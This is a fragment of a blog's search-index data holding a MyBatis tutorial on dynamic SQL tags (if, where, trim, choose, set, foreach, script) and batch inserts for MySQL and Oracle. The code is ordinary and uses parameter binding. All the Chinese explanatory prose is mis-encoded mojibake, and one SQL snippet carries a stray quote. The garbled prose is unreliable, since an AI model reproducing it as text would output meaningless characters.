navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java æ•°æ®åº“"},{title:"Java æ¶æ„å¸ˆçŸ¥è¯†å›¾è°± (æœ€æ–°)",url:"/posts/49881333.html",text:'JEE åŸºç¡€ä¹‹ä¸€ JEE åŸºç¡€ä¹‹äºŒ Java é«˜çº§æ¶æ„å¸ˆ Java ç™¾ä¸‡æ¶æ„å¸ˆ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"çŸ¥è¯†å›¾è°±"},{title:"MyBatis å…¥é—¨æ•™ç¨‹ä¹‹äº”",url:"/posts/71a2ce7f.html",text:'å‰è¨€æœ¬æ–‡çš„æ‰€æœ‰æ¡ˆä¾‹ä»£ç ï¼Œè‹¥æ²¡æœ‰ç‰¹åˆ«è¯´æ˜ï¼Œé»˜è®¤éƒ½åŸºäºä»¥ä¸‹çš„è¡¨ç»“æ„å’Œ JavaBean ç±»ç¼–å†™ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-lesson-15ã€‚ 12345678CREATE TABLE `t_employee` ( `id` int(11) NOT NULL AUTO_INCREMENT, `last_name` varchar(255) DEFAULT NULL, `gender` char(1) DEFAULT NULL, `email` varchar(255) DEFAULT NULL, `dept_id` int(11) DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8; 123456789101112131415public class Employee { private Long id; private String lastName; private String gender; private String email; private Department department; ...... @Override public String toString() { return "Employee [id=" + id + ", lastName=" + lastName + ", gender=" + gender + ", email=" + email + ", department=" + department + "]"; }} åŠ¨æ€ SQL åŠ¨æ€ SQL æ˜¯ MyBatis å¼ºå¤§ç‰¹æ€§ä¹‹ä¸€ï¼Œæå¤§çš„ç®€åŒ–æ‹¼è£… SQL çš„æ“ä½œã€‚ åŠ¨æ€ SQL æ ‡ç­¾å’Œä½¿ç”¨ JSTL æˆ–å…¶ä»–ç±»ä¼¼åŸºäº XML çš„æ–‡æœ¬å¤„ç†å™¨ç›¸ä¼¼ã€‚ MyBatis é‡‡ç”¨åŠŸèƒ½å¼ºå¤§çš„åŸºäº OGNL çš„è¡¨è¾¾å¼æ¥ç®€åŒ–æ“ä½œï¼Œå¹¶æä¾›äº† ifã€trim (where, set)ã€foreachã€choose (when, otherwise) åŠ¨æ€ SQL æ ‡ç­¾ã€‚ if æ ‡ç­¾12345public interface EmployeeMapper { public List&lt;Employee&gt; getEmpsByConditionIf(Employee employee);} 12345678910111213141516171819202122&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getEmpsByConditionIf" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee where &lt;if test="id != null"&gt; id = #{id} &lt;/if&gt; &lt;if test="lastName != null and lastName.trim() != \'\'"&gt; and last_name = #{lastName} &lt;/if&gt; &lt;if test="email != null and email.trim() != \'\'"&gt; and email = #{email} &lt;/if&gt; &lt;!-- OGNL ä¼šè‡ªåŠ¨å¯¹å­—ç¬¦ä¸²ä¸æ•°å­—è¿›è¡Œè½¬æ¢ --&gt; &lt;if test="gender == 1 or gender == 0"&gt; and gender = #{gender} &lt;/if&gt; &lt;/select&gt;&lt;/mapper&gt; ç‰¹åˆ«æ³¨æ„ ä¸Šè¿°çš„å†™æ³•ï¼Œå¦‚æœä¼ é€’è¿›æ¥çš„ JavaBean å‚æ•°çš„ id å±æ€§åˆšå¥½ä¸º null æ—¶ï¼ŒMyBatis æ‰§è¡Œåä¼šæç¤º SQL å­˜åœ¨è¯­æ³•é”™è¯¯ï¼ˆSQL è¯­å¥ä¸­æœ‰å¤šä½™çš„ and å…³é”®å­—ï¼‰ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \'and last_name = \'Jim\' where æ ‡ç­¾è§£å†³ä¸Šè¿° if æ ‡ç­¾å¸¦æ¥çš„ SQL æ‹¼æ¥å‡ºé”™é—®é¢˜ï¼Œä¸€èˆ¬æœ‰ä»¥ä¸‹ä¸¤ç§æ–¹æ³•ï¼š ç¬¬ä¸€ç§æ–¹æ³•ï¼šåœ¨ where å…³é”®å­—åé¢åŠ ä¸Š 1 = 1ï¼ŒåŒæ—¶æŒ‡å®š if æ ‡ç­¾é‡Œçš„å†…å®¹éƒ½ä»¥ and æˆ–è€… or å…³é”®å­—å¼€å¤´ 123456789101112131415161718192021&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getEmpsByConditionIf" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee where 1 = 1 &lt;if test="id != null"&gt; and id = #{id} &lt;/if&gt; &lt;if test="lastName != null and lastName.trim() != \'\'"&gt; and last_name = #{lastName} &lt;/if&gt; &lt;if test="email != null and email.trim() != \'\'"&gt; and email = #{email} &lt;/if&gt; &lt;if test="gender == 1 or gender == 0"&gt; and gender = #{gender} &lt;/if&gt; &lt;/select&gt;&lt;/mapper&gt; ç¬¬äºŒç§æ–¹æ³•ï¼šä½¿ç”¨ where æ ‡ç­¾æ›¿ä»£ where å…³é”®å­— æç¤º where æ ‡ç­¾ç”¨äºå°è£…æŸ¥è¯¢æ¡ä»¶ï¼Œä¸€èˆ¬æ˜¯å’Œ if æ ‡ç­¾ä¸€èµ·ä½¿ç”¨ where æ ‡ç­¾åªä¼šåœ¨å­æ ‡ç­¾è¿”å›ä»»ä½•å†…å®¹çš„æƒ…å†µä¸‹ï¼Œæ‰è‡ªåŠ¨æ’å…¥ where å…³é”®å­— ä½¿ç”¨ where æ ‡ç­¾åŠ¨æ€æ‹¼æ¥ SQL è¯­å¥æ—¶ï¼Œä¼šè‡ªåŠ¨å°†æŸ¥è¯¢æ¡ä»¶å¤´éƒ¨å¤šå‡ºæ¥çš„ and æˆ–è€… or å…³é”®å­—å»æ‰ ç‰¹åˆ«æ³¨æ„ï¼Œwhere æ ‡ç­¾ä¸ä¼šè‡ªåŠ¨å°†æŸ¥è¯¢æ¡ä»¶å°¾éƒ¨å¤šå‡ºæ¥çš„ and æˆ–è€… or å…³é”®å­—å»æ‰ 1234567891011121314151617181920212223&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getEmpsByConditionIf" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee &lt;!-- åˆ©ç”¨ where æ ‡ç­¾ï¼Œå°†æŸ¥è¯¢æ¡ä»¶å¤´éƒ¨å¤šå‡ºæ¥çš„ and æˆ–è€… or å…³é”®å­—å»æ‰ --&gt; &lt;where&gt; &lt;if test="id != null"&gt; id = #{id} &lt;/if&gt; &lt;if test="lastName != null and lastName.trim() != \'\'"&gt; and last_name = #{lastName} &lt;/if&gt; &lt;if test="email != null and email.trim() != \'\'"&gt; and email = #{email} &lt;/if&gt; &lt;if test="gender == 1 or gender == 0"&gt; and gender = #{gender} &lt;/if&gt; &lt;/where&gt; &lt;/select&gt;&lt;/mapper&gt; trim æ ‡ç­¾é™¤äº†ä¸Šè¿°çš„ä¸¤ç§æ–¹æ³•ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ trim æ ‡ç­¾ï¼Œä»¥æ­¤è§£å†³ where æ ‡ç­¾ä¸èƒ½è‡ªåŠ¨å°†æŸ¥è¯¢æ¡ä»¶å°¾éƒ¨å¤šå‡ºæ¥çš„ and æˆ–è€… or å…³é”®å­—å»æ‰çš„é—®é¢˜ã€‚trim æ ‡ç­¾ç”¨äºè‡ªå®šä¹‰å­—ç¬¦ä¸²å†…å®¹çš„æˆªå–ï¼Œå…¶æ ‡ç­¾ä½“ä¸­çš„å†…å®¹æ˜¯ SQL å­—ç¬¦ä¸²æ‹¼æ¥åçš„ç»“æœã€‚trim æ ‡ç­¾æ‹¥æœ‰ä»¥ä¸‹å±æ€§ï¼š prefixï¼šç»™æ‹¼æ¥åçš„æ•´ä¸ªå­—ç¬¦ä¸²åŠ ä¸€ä¸ªå‰ç¼€ prefixOverridesï¼šå»æ‰æ‹¼æ¥åæ•´ä¸ªå­—ç¬¦ä¸²å¤´éƒ¨å¤šä½™çš„å­—ç¬¦ suffixï¼šç»™æ‹¼æ¥åçš„æ•´ä¸ªå­—ç¬¦ä¸²åŠ ä¸€ä¸ªåç¼€ suffixOverridesï¼šå»æ‰æ‹¼æ¥åæ•´ä¸ªå­—ç¬¦ä¸²å°¾éƒ¨å¤šä½™çš„å­—ç¬¦ 12345public interface EmployeeMapper { public List&lt;Employee&gt; getEmpsByConditionTrim(Employee employee); } 1234567891011121314151617181920212223&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getEmpsByConditionTrim" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee &lt;!-- åˆ©ç”¨ trim æ ‡ç­¾ï¼Œå¾€å¤´éƒ¨æ’å…¥ where å…³é”®å­—ï¼Œå¹¶å»æ‰å°¾éƒ¨çš„ and æˆ–è€… or å…³é”®å­— --&gt; &lt;trim prefix="where" suffixOverrides="and | or"&gt; &lt;if test="id != null"&gt; id = #{id} and &lt;/if&gt; &lt;if test="lastName != null and lastName.trim() != \'\'"&gt; last_name = #{lastName} and &lt;/if&gt; &lt;if test="email != null and email.trim() != \'\'"&gt; email = #{email} and &lt;/if&gt; &lt;if test="gender == 1 or gender == 0"&gt; gender = #{gender} &lt;/if&gt; &lt;/trim&gt; &lt;/select&gt;&lt;/mapper&gt; choose æ ‡ç­¾choose æ ‡ç­¾æ˜¯æŒ‰é¡ºåºåˆ¤æ–­å…¶å†…éƒ¨ when æ ‡ç­¾ä¸­çš„ test æ¡ä»¶æ˜¯å¦æˆç«‹ã€‚å®ƒå’Œ if - else ä¸å¤ªç›¸åŒï¼Œchoose æ ‡ç­¾ç±»ä¼¼äº Java ä¸­çš„ switch è¯­å¥ç”¨æ³•ï¼Œåªè¦æœ‰åˆ¤æ–­æ¡ä»¶æˆç«‹ï¼Œå…¶å®ƒåˆ¤æ–­å°†å¾—ä¸åˆ°æ‰§è¡Œï¼Œå¦‚æœæ‰€æœ‰æ¡ä»¶éƒ½ä¸æˆç«‹åˆ™ä¼šæ‰§è¡Œ otherwise æ ‡ç­¾ä¸­çš„å†…å®¹ã€‚ 12345public interface EmployeeMapper { public List&lt;Employee&gt; getEmpsByConditionChoose(Employee employee);} 12345678910111213141516171819202122232425&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getEmpsByConditionChoose" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee &lt;where&gt; &lt;!-- ä¸‹è¿°çš„æ¡ä»¶åˆ¤æ–­ï¼Œåªæœ‰ä¸€ä¸ªä¼šè¢«æ‰§è¡Œ --&gt; &lt;choose&gt; &lt;when test="id != null"&gt; id = #{id} &lt;/when&gt; &lt;when test="lastName != null and lastName.trim() != \'\'"&gt; last_name = #{lastName} &lt;/when&gt; &lt;when test="email != null and email.trim() != \'\'"&gt; email = #{email} &lt;/when&gt; &lt;otherwise&gt; gender = 1 &lt;/otherwise&gt; &lt;/choose&gt; &lt;/where&gt; &lt;/select&gt;&lt;/mapper&gt; set æ ‡ç­¾12345public interface EmployeeMapper { public void updateEmp(Employee employee); } 123456789101112131415161718&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;update id="updateEmp" parameterType="com.clay.mybatis.bean.Employee"&gt; update t_employee set &lt;if test="lastName != null and lastName.trim() != \'\'"&gt; last_name = #{lastName}, &lt;/if&gt; &lt;if test="email != null and email.trim() != \'\'"&gt; email = #{email}, &lt;/if&gt; &lt;if test="gender == 1 or gender == 0"&gt; gender = #{gender} &lt;/if&gt; where id = #{id} &lt;/update&gt;&lt;/mapper&gt; ç‰¹åˆ«æ³¨æ„ ä¸Šè¿° SQL æ›´æ–°è¯­å¥çš„å†™æ³•ï¼Œå¦‚æœä¼ é€’è¿›æ¥çš„ JavaBean å‚æ•°çš„ last_name ä¸ä¸º nullï¼Œä¸” gender å±æ€§åˆšå¥½ä¸º null æ—¶ï¼ŒMyBatis æ‰§è¡Œåä¼šæç¤º SQL å­˜åœ¨è¯­æ³•é”™è¯¯ï¼ˆSQL è¯­å¥ä¸­å­˜åœ¨å¤šä½™çš„é€—å·ï¼‰ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \'where id = 1\' æç¤º set æ ‡ç­¾ç”¨äº SQL æ›´æ–°è¯­å¥ä¸­ï¼Œä¸€èˆ¬æ˜¯å’Œ if æ ‡ç­¾ä¸€èµ·ä½¿ç”¨ set æ ‡ç­¾å¯ä»¥è§£æä¸º set å…³é”®å­—ï¼Œå¹¶å»é™¤ SQL æ›´æ–°è¯­å¥ä¸­å°¾éƒ¨å¤šä½™çš„é€—å· ä¸ºäº†è§£å†³ä¸Šé¢ SQL æ‹¼æ¥å‡ºé”™çš„é—®é¢˜ï¼Œå¯ä»¥ä½¿ç”¨ set æ ‡ç­¾æ¥è§£å†³ï¼š 1234567891011121314151617181920&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;update id="updateEmp" parameterType="com.clay.mybatis.bean.Employee"&gt; update t_employee &lt;!-- åˆ©ç”¨ set æ ‡ç­¾ï¼Œå»æ‰æ›´æ–°è¯­å¥ä¸­å°¾éƒ¨å¤šä½™çš„é€—å· --&gt; &lt;set&gt; &lt;if test="lastName != null and lastName.trim() != \'\'"&gt; last_name = #{lastName}, &lt;/if&gt; &lt;if test="email != null and email.trim() != \'\'"&gt; email = #{email}, &lt;/if&gt; &lt;if test="gender == 1 or gender == 0"&gt; gender = #{gender} &lt;/if&gt; &lt;/set&gt; where id = #{id} &lt;/update&gt;&lt;/mapper&gt; æˆ–è€…ä¹Ÿå¯ä»¥ä½¿ç”¨ trim æ ‡ç­¾æ¥è§£å†³é—®é¢˜ 1234567891011121314151617181920&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;update id="updateEmp" parameterType="com.clay.mybatis.bean.Employee"&gt; update t_employee &lt;!-- åˆ©ç”¨ trim æ ‡ç­¾ï¼Œå¾€å¤´éƒ¨æ’å…¥ set å…³é”®å­—ï¼Œå¹¶å»æ‰å°¾éƒ¨å¤šä½™çš„é€—å· --&gt; &lt;trim prefix="set" suffixOverrides=","&gt; &lt;if test="lastName != null and lastName.trim() != \'\'"&gt; last_name = #{lastName}, &lt;/if&gt; &lt;if test="email != null and email.trim() != \'\'"&gt; email = #{email}, &lt;/if&gt; &lt;if test="gender == 1 or gender == 0"&gt; gender = #{gender} &lt;/if&gt; &lt;/trim&gt; where id = #{id} &lt;/update&gt;&lt;/mapper&gt; foreach æ ‡ç­¾å±æ€§è¯´æ˜foreach æ ‡ç­¾å¯ç”¨äºéå†é›†åˆï¼Œå¹¶æ‹¥æœ‰ä»¥ä¸‹å±æ€§ï¼š å±æ€§ å¿…å¡« æè¿° collection æ˜¯ è¡¨ç¤ºè¿­ä»£é›†åˆçš„åç§° item æ˜¯ è¡¨ç¤ºæœ¬æ¬¡è¿­ä»£è·å–çš„å…ƒç´ ï¼Œè‹¥ collection ä¸º Listã€Set æˆ–è€…æ•°ç»„ï¼Œåˆ™è¡¨ç¤ºå…¶ä¸­çš„å…ƒç´ ï¼›è‹¥ collection ä¸º Mapï¼Œåˆ™ä»£è¡¨ Map çš„ value open å¦ è¡¨ç¤ºè¯¥è¯­å¥ä»¥ä»€ä¹ˆå­—ç¬¦å¼€å§‹ï¼Œæœ€å¸¸ç”¨çš„æ˜¯å·¦æ‹¬å¼§ ( å­—ç¬¦ï¼ŒMybatis ä¼šå°†è¯¥å­—ç¬¦æ‹¼æ¥åˆ°æ•´ä½“çš„ SQL è¯­å¥ä¹‹å‰ï¼Œå¹¶ä¸”åªæ‹¼æ¥ä¸€æ¬¡ close å¦ è¡¨ç¤ºè¯¥è¯­å¥ä»¥ä»€ä¹ˆå­—ç¬¦ç»“æŸï¼Œæœ€å¸¸ç”¨çš„æ˜¯å³æ‹¬å¼§ )ï¼ŒMyBatis ä¼šå°†è¯¥å­—ç¬¦æ‹¼æ¥åˆ°æ•´ä½“çš„ SQL è¯­å¥ä¹‹åï¼Œå¹¶ä¸”åªæ‹¼æ¥ä¸€æ¬¡ separator å¦ MyBatis ä¼šåœ¨æ¯æ¬¡è¿­ä»£åç»™ SQL è¯­å¥æ‹¼æ¥ä¸Š separator å±æ€§æŒ‡å®šçš„å­—ç¬¦ï¼ˆä¾‹å¦‚é€—å· ,ï¼‰ index å¦ åœ¨ Listã€Set å’Œæ•°ç»„ä¸­ï¼Œindex è¡¨ç¤ºå½“å‰è¿­ä»£çš„ä½ç½®ï¼ˆç´¢å¼•ï¼‰ï¼Œåœ¨ Map ä¸­ï¼Œindex ä»£è¡¨çš„æ˜¯ Map çš„ key åœ¨ä½¿ç”¨ foreach æ ‡ç­¾çš„æ—¶å€™ï¼Œæœ€å…³é”®ä¹Ÿæ˜¯æœ€å®¹æ˜“å‡ºé”™çš„å°±æ˜¯ collection å±æ€§ï¼Œè¯¥å±æ€§æ˜¯å¿…é¡»æŒ‡å®šçš„ï¼Œä½†æ˜¯åœ¨ä¸åŒæƒ…å†µä¸‹ï¼Œè¯¥å±æ€§çš„å€¼æ˜¯ä¸ä¸€æ ·çš„ï¼Œä¸»è¦æœ‰ä»¥ä¸‹ 3 ç§æƒ…å†µï¼š å¦‚æœä¼ å…¥çš„æ˜¯å•å‚æ•°ä¸”å‚æ•°ç±»å‹æ˜¯ä¸€ä¸ª List çš„æ—¶å€™ï¼Œcollection çš„å±æ€§å€¼é»˜è®¤æ˜¯ list å¦‚æœä¼ å…¥çš„æ˜¯å•å‚æ•°ä¸”å‚æ•°ç±»å‹æ˜¯ä¸€ä¸ªæ•°ç»„çš„æ—¶å€™ï¼Œcollection çš„å±æ€§å€¼é»˜è®¤æ˜¯ array å¦‚æœä¼ å…¥çš„å‚æ•°æœ‰å¤šä¸ªçš„æ—¶å€™ï¼Œå°±éœ€è¦æŠŠå®ƒä»¬å°è£…æˆä¸€ä¸ª Map äº†ï¼Œå½“ç„¶å•å‚æ•°ä¹Ÿå¯ä»¥å°è£…æˆ Mapã€‚å®é™…ä¸Šåœ¨ä¼ å…¥å‚æ•°çš„æ—¶å€™ï¼ŒMyBatis çš„åº•å±‚ä»£ç ä¹Ÿæ˜¯ä¼šè‡ªåŠ¨æŠŠå‚æ•°å°è£…æˆä¸€ä¸ª Map çš„ï¼ŒMap çš„ key å°±æ˜¯å‚æ•°åï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™ collection å±æ€§å€¼å°±æ˜¯ä¼ å…¥çš„ List æˆ– Array å¯¹è±¡åœ¨è‡ªå·±å°è£…çš„ Map é‡Œé¢çš„ key æç¤º åœ¨ MyBatis ä¸­ï¼Œä½¿ç”¨ List ä¼ é€’å‚æ•°çš„è¯¦ç»†æ•™ç¨‹å¯çœ‹è¿™é‡Œã€‚ æ•°æ®æ‰¹é‡æŸ¥è¯¢æ¡ˆä¾‹12345public interface EmployeeMapper { public List&lt;Employee&gt; getEmpsByConditionByForeach(List&lt;Long&gt; ids);} 123456789101112&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getEmpsByConditionByForeach" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee where id in &lt;foreach collection="list" item="id" open="(" separator="," close=")"&gt; #{id} &lt;/foreach&gt; &lt;/select&gt;&lt;/mapper&gt; æˆ–è€…ä½¿ç”¨ @Param æ³¨è§£æŒ‡å®šå‚æ•°åç§°ï¼š 12345public interface EmployeeMapper { public List&lt;Employee&gt; getEmpsByConditionByForeach(@Param("ids") List&lt;Long&gt; ids);} 123456789101112&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getEmpsByConditionByForeach" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee where id in &lt;foreach collection="ids" item="id" open="(" separator="," close=")"&gt; #{id} &lt;/foreach&gt; &lt;/select&gt; &lt;/mapper&gt; MySQL æ•°æ®åº“æ•°æ®æ‰¹é‡æ’å…¥æ¡ˆä¾‹ä¸€12345public interface EmployeeMapper { public void addEmps(@Param("emps") List&lt;Employee&gt; emps); } 123456789101112&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;!-- MySQL ç¬¬ä¸€ç§æ•°æ®æ‰¹é‡æ’å…¥æ–¹å¼ --&gt; &lt;insert id="addEmps"&gt; insert into t_employee(last_name, gender, email) values &lt;foreach collection="emps" item="emp" separator=","&gt; (#{emp.lastName}, #{emp.gender}, #{emp.email}) &lt;/foreach&gt; &lt;/insert&gt;&lt;/mapper&gt; æ•°æ®æ‰¹é‡æ’å…¥æ¡ˆä¾‹äºŒ12345public interface EmployeeMapper { public void addEmps(@Param("emps") List&lt;Employee&gt; emps); } 1234567891011&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;!-- MySQL ç¬¬äºŒç§æ•°æ®æ‰¹é‡æ’å…¥æ–¹å¼ --&gt; &lt;insert id="addEmps"&gt; &lt;foreach collection="emps" item="emp"&gt; insert into t_employee(last_name, gender, email) values(#{emp.lastName}, #{emp.gender}, #{emp.email}); &lt;/foreach&gt; &lt;/insert&gt;&lt;/mapper&gt; ç‰¹åˆ«æ³¨æ„ é»˜è®¤æƒ…å†µä¸‹ MyBatis ä¸å…è®¸å¤šæ¡è¯­å¥åŒæ—¶æ‰§è¡Œï¼Œå› æ­¤éœ€è¦åœ¨è¿æ¥ MySQL çš„ url ä¸­å¢åŠ  allowMultiQueries=true é…ç½®å†…å®¹ï¼Œå¦åˆ™ä¸Šè¿° SQL æ‰§è¡Œæ—¶ä¼šå‡ºé”™ã€‚ å¦‚æœæ‰¹é‡æ’å…¥å¤§é‡çš„æ•°æ®ï¼Œä¸Šè¿°çš„æ‰¹é‡æ’å…¥æ–¹å¼å¯èƒ½ä¼šæ‰§è¡Œå¤±è´¥ï¼Œè¿™æ˜¯ç”±äº MySQL å¯¹ SQL è¯­å¥çš„é•¿åº¦æœ‰é™åˆ¶å¯¼è‡´çš„ã€‚ Oracle æ•°æ®åº“Oracle ä¸æ”¯æŒä½¿ç”¨ insert ... values(),()... çš„æ–¹å¼æ‰¹é‡æ’å…¥æ•°æ®ï¼Œä½†æ”¯æŒä½¿ç”¨ begin ... end; æˆ–è€…ä¸­é—´è¡¨çš„æ–¹å¼æ¥å®ç°æ•°æ®çš„æ‰¹é‡æ’å…¥ã€‚ æ•°æ®æ‰¹é‡æ’å…¥æ¡ˆä¾‹ä¸€12345public interface EmployeeMapper { public void addEmps(@Param("emps") List&lt;Employee&gt; emps); } 1234567891011&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;!-- Oracle ç¬¬ä¸€ç§æ•°æ®æ‰¹é‡æ’å…¥æ–¹å¼ --&gt; &lt;insert id="addEmps" databaseId="oracle"&gt; &lt;foreach collection="emps" item="emp" open="begin" close="end;"&gt; insert into t_employee(id, last_name, gender, email) values(employees_seq.nextval, #{emp.lastName}, #{emp.gender}, #{emp.email}); &lt;/foreach&gt; &lt;/insert&gt;&lt;/mapper&gt; æœ€ç»ˆä¼šå‘å‡ºç±»ä¼¼ä¸‹é¢çš„ SQL è¯­å¥åˆ° Oracle æ•°æ®åº“ï¼š 12345begin insert into t_employee(id, last_name, gender, email) values (1, \'Jim\', \'1\', \'jim@gmail.com\'); insert into t_employee(id, last_name, gender, email) values (2, \'Tom\', \'1\', \'tom@gmail.com\'); insert into t_employee(id, last_name, gender, email) values (3, \'Peter\', \'1\', \'peter@gmail.com\');end; æ•°æ®æ‰¹é‡æ’å…¥æ¡ˆä¾‹äºŒ12345public interface EmployeeMapper { public void addEmps(@Param("emps") List&lt;Employee&gt; emps); } 1234567891011&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;!-- Oracle ç¬¬äºŒç§æ•°æ®æ‰¹é‡æ’å…¥æ–¹å¼ --&gt; &lt;insert id="addEmps" databaseId="oracle"&gt; insert into t_employee(id, last_name, gender, email) &lt;foreach collection="emps" item="emp" separator="union" open="select employees_seq.nextval, lastName, gender, email from (" close=")"&gt; select #{emp.lastName} lastName, #{emp.gender} gender, #{emp.email} email from dual &lt;/foreach&gt; &lt;/insert&gt;&lt;/mapper&gt; æœ€ç»ˆä¼šå‘å‡ºç±»ä¼¼ä¸‹é¢çš„ SQL è¯­å¥åˆ° Oracle æ•°æ®åº“ï¼š 12345678insert into t_employee(id, last_name, gender, email)select employees_seq.nextval, lastName, gender, email from ( select \'Jim\' lastName, \'1\' gender, \'jim@gmail.com\' email from dual union select \'Tom\' lastName, \'1\' gender, \'tom@gmail.com\' email from dual union select \'Peter\' lastName, \'1\' gender, \'peter@gmail.com\' email from dual) script æ ‡ç­¾è‹¥è¦åœ¨å¸¦æ³¨è§£çš„ DAO æ¥å£ä¸­ä½¿ç”¨åŠ¨æ€ SQL è¯­å¥ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ script æ ‡ç­¾æ¥å®ç°ï¼Œä¾‹å¦‚ï¼š 1234567891011@Update({"&lt;script&gt;", "update Author", " &lt;set&gt;", " &lt;if test=\'username != null\'&gt;username=#{username},&lt;/if&gt;", " &lt;if test=\'password != null\'&gt;password=#{password},&lt;/if&gt;", " &lt;if test=\'email != null\'&gt;email=#{email},&lt;/if&gt;", " &lt;if test=\'bio != null\'&gt;bio=#{bio}&lt;/if&gt;", " &lt;/set&gt;", "where id=#{id}", "&lt;/script&gt;"})public void updateAuthorValues(Author author); å¤šæ•°æ®åº“æ”¯æŒè‹¥åœ¨ MyBatis çš„å…¨å±€é…ç½®æ–‡ä»¶ä¸­é…ç½®äº† databaseIdProvider æ ‡ç­¾ï¼ˆæ•°æ®åº“å‚å•†æ ‡è¯†ï¼‰ï¼Œé‚£ä¹ˆå¯ä»¥åœ¨åŠ¨æ€ SQL ä¸­ä½¿ç”¨åä¸º _databaseId çš„å˜é‡ï¼ˆMyBatis å†…ç½®å‚æ•°ï¼‰æ¥ä¸ºä¸åŒçš„æ•°æ®åº“æ„å»ºç‰¹å®šçš„è¯­å¥ã€‚_databaseId å†…ç½®å‚æ•°çš„è¯¦ç»†ä½¿ç”¨æ•™ç¨‹ï¼Œå¯ä»¥æŸ¥çœ‹è¿™é‡Œã€‚ 123456789&lt;configuration&gt; &lt;!-- æ•°æ®åº“å‚å•†æ ‡è¯† --&gt; &lt;databaseIdProvider type="DB_VENDOR"&gt; &lt;property name="SQL Server" value="sqlserver" /&gt; &lt;property name="DB2" value="db2" /&gt; &lt;property name="MySQL" value="mysql" /&gt; &lt;property name="Oracle" value="oracle" /&gt; &lt;/databaseIdProvider&gt;&lt;/configuration&gt; 1234567891011&lt;insert id="insert"&gt; &lt;selectKey keyProperty="id" resultType="int" order="BEFORE"&gt; &lt;if test="_databaseId == \'oracle\'"&gt; select seq_users.nextval from dual &lt;/if&gt; &lt;if test="_databaseId == \'db2\'"&gt; select nextval for seq_users from sysibm.sysdummy1" &lt;/if&gt; &lt;/selectKey&gt; insert into users values (#{id}, #{name})&lt;/insert&gt; æ’å…¥è„šæœ¬è¯­è¨€MyBatis ä» 3.2 ç‰ˆæœ¬å¼€å§‹æ”¯æŒæ’å…¥è„šæœ¬è¯­è¨€ï¼Œè¿™å…è®¸å¼€å‘è€…æ’å…¥ä¸€ç§è¯­è¨€é©±åŠ¨ï¼Œå¹¶åŸºäºè¿™ç§è¯­è¨€æ¥ç¼–å†™åŠ¨æ€ SQL æŸ¥è¯¢è¯­å¥ã€‚ é€šè¿‡å®ç°ä»¥ä¸‹æ¥å£æ¥æ’å…¥ä¸€ç§è„šæœ¬è¯­è¨€ 1234567public interface LanguageDriver { ParameterHandler createParameterHandler(MappedStatement mappedStatement, Object parameterObject, BoundSql boundSql); SqlSource createSqlSource(Configuration configuration, XNode script, Class&lt;?&gt; parameterType); SqlSource createSqlSource(Configuration configuration, String script, Class&lt;?&gt; parameterType);} å®ç°è‡ªå®šä¹‰è¯­è¨€é©±åŠ¨åï¼Œå°±å¯ä»¥åœ¨ mybatis-config.xml 